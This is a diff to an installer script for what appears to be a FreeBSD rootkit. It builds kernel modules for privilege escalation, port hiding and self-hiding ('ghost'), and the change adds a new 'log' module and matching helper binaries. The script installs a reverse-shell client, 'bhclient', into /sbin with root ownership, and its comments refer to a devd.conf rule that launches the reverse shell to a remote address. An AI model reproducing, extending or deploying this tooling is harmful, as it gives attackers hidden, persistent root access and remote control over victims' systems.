@@ -17,7 +17,7 @@ fi
 # The .ko file should be named module.ko
 # The c file should be named module-kld.c
 # IMPORTANT: put ghost last as it will hides all the other KLDs when loaded
-klds="elevate remote port_hiding ghost"
+klds="elevate remote port_hiding log ghost"
 
 for kld in ${klds}; do
   # Clean kld
@@ -59,8 +59,14 @@ if [ "$?" -ne 0 ]; then
   exit 1
 fi
 
-# Install bhclient (reverse shell) to /sbin
+# Install bhclient (reverse shell) and log/log-helper utilities
 install -o root -g wheel -m 755 bhclient /sbin/bhclient
+if [ -e "./log" ]; then
+  install -o root -g wheel -m 755 log /sbin/log
+fi
+if [ -e "./log-helper" ]; then
+  install -o root -g wheel -m 755 log-helper /sbin/log-helper
+fi
 
 # Add matching rule in /etc/devd.conf to run reverse shell to remote address
 if ! grep -q "DHCLIENT" /etc/devd.conf; then
